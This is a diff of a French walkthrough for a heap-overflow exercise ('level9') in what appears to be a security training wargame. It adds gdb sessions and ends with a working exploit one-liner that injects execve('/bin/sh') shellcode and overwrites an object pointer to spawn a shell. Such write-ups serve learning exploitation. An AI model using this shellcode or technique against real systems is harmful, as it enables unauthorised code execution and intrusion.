@@ -3,9 +3,13 @@
 > ./level9 test
 
 > info functions
-    [...]
-    0x080485f4  main
-    [...]
+	[...]
+	0x080485f4  main
+	0x080486f6  N::N(int)
+	0x0804870e  N::setAnnotation(char*)
+	0x0804873a  N::operator+(N&)
+	0x0804874e  N::operator-(N&)
+	[...]
 
 > disas main
    0x080485f4 <+0>: 	push   %ebp
@@ -104,5 +108,23 @@
    0x0804874b <+17>:	pop    %ebp
    0x0804874c <+18>:	ret
 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+On doit regarder l'adresse de eax quand on execute la fonction setAnnotation avec argv[1]
 
+(gdb) b *main+136
+Breakpoint 1 at 0x804867c
+(gdb) run AAAA
+Starting program: /home/user/level9/level9 AAAA
+
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x $eax
+0x804a00c:	0x41414141
+
+L'adresse de annotation du premier objet de la classe N est donc 0x804a00c
+En reutilisant le shellcode du level2 afin de lancer un execve("/bin/sh", 0, 0)
+
+On envoi d'abord l'adresse du debut du shellcode, puis le shellcode (meme que level2), un padding de 83 octets pour atteindre 108 octets afin de remplir annotation.
+Enfin on envoi a l'adresse de annotation pour executer le shellcode.
+
+[addresse_shellcode] + [shellcode] + [padding] + [adresse de annotation]
+	
+./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"'`
